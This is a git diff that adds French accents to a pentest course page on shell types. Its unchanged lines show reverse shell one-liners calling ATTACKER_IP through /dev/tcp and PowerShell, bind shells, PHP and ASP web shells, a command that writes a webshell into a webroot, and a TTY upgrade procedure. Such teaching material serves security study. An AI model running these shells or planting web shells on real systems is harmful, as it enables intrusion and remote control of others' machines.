@@ -1,14 +1,14 @@
 # Types de shells
 
-[<< Precedent : Exploits publics](04-exploits-publics.md) | [Suivant : Elevation de privileges >>](06-elevation-de-privileges.md)
+[<< Précédent : Exploits publics](04-exploits-publics.md) | [Suivant : Élévation de privileges >>](06-elevation-de-privileges.md)
 
 ---
 
 ## Comparaison
 
-| Type | Fonctionnement | Qui ecoute |
+| Type | Fonctionnement | Qui écoute |
 |------|---------------|------------|
-| **Reverse shell** | La cible se connecte a l'attaquant | L'attaquant (`nc -lvnp`) |
+| **Reverse shell** | La cible se connecte à l'attaquant | L'attaquant (`nc -lvnp`) |
 | **Bind shell** | La cible ouvre un port, l'attaquant s'y connecte | La cible |
 | **Web shell** | Script sur le serveur web, commandes via HTTP | Le serveur web |
 
@@ -22,7 +22,7 @@ L'attaquant met en place un listener, puis exploite la cible pour qu'elle se con
 # 1) Listener sur notre machine
 nc -lvnp 1234
 
-# 2) Commande executee sur la cible (Linux - bash)
+# 2) Commande exécutée sur la cible (Linux - bash)
 bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1'
 
 # Alternative avec netcat (plus fiable sur certaines distros)
@@ -35,7 +35,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_
 ```
 
 **Avantage** : rapide, fiable, contourne le firewall entrant.
-**Inconvenient** : si la connexion tombe, il faut re-exploiter.
+**Inconvénient** : si la connexion tombe, il faut re-exploiter.
 
 ---
 
@@ -57,13 +57,13 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.So
 ```
 
 **Avantage** : on peut se reconnecter si la connexion tombe (tant que le processus tourne).
-**Inconvenient** : necessite un port ouvert sur la cible (souvent bloque par le firewall).
+**Inconvénient** : nécessite un port ouvert sur la cible (souvent bloqué par le firewall).
 
 ---
 
 ## Web shell
 
-Script depose sur le serveur web qui execute des commandes via des parametres HTTP.
+Script déposé sur le serveur web qui exécute des commandes via des paramètres HTTP.
 
 ```php
 <?php system($_REQUEST["cmd"]); ?>
@@ -77,7 +77,7 @@ Script depose sur le serveur web qui execute des commandes via des parametres HT
 <% eval request("cmd") %>
 ```
 
-**Webroots par defaut :**
+**Webroots par défaut :**
 
 | Serveur | Chemin |
 |---------|--------|
@@ -87,40 +87,40 @@ Script depose sur le serveur web qui execute des commandes via des parametres HT
 | XAMPP | `C:\xampp\htdocs\` |
 
 ```bash
-# Ecrire un webshell
+# Écrire un webshell
 echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
 
-# Executer une commande
+# Exécuter une commande
 curl http://TARGET_IP/shell.php?cmd=id
 ```
 
-**Avantage** : passe par le port web (80/443), survit aux redemarrages.
-**Inconvenient** : pas interactif, pas de TTY.
+**Avantage** : passe par le port web (80/443), survit aux redémarrages.
+**Inconvénient** : pas interactif, pas de TTY.
 
 ---
 
 ## Upgrade TTY (critique)
 
-Un reverse/bind shell brut ne permet pas d'utiliser `su`, `sudo`, les editeurs, ni l'historique de commandes. Il faut l'upgrader :
+Un reverse/bind shell brut ne permet pas d'utiliser `su`, `sudo`, les éditeurs, ni l'historique de commandes. Il faut l'upgrader :
 
 ```bash
-# Etape 1 : spawn un pseudo-terminal
+# Étape 1 : spawn un pseudo-terminal
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
-# Etape 2 : backgrounder le shell
+# Étape 2 : backgrounder le shell
 # Appuyer sur Ctrl+Z
 
-# Etape 3 : configurer notre terminal local
+# Étape 3 : configurer notre terminal local
 stty raw -echo
 fg
 # Appuyer sur Entree x2
 
-# Etape 4 : configurer le terminal distant
+# Étape 4 : configurer le terminal distant
 export TERM=xterm-256color
-stty rows 67 columns 318    # adapter a votre terminal
+stty rows 67 columns 318    # adapter à votre terminal
 ```
 
-Pour connaitre les valeurs rows/columns, ouvrir un autre terminal et taper :
+Pour connaître les valeurs rows/columns, ouvrir un autre terminal et taper :
 
 ```bash
 echo $TERM        # -> xterm-256color
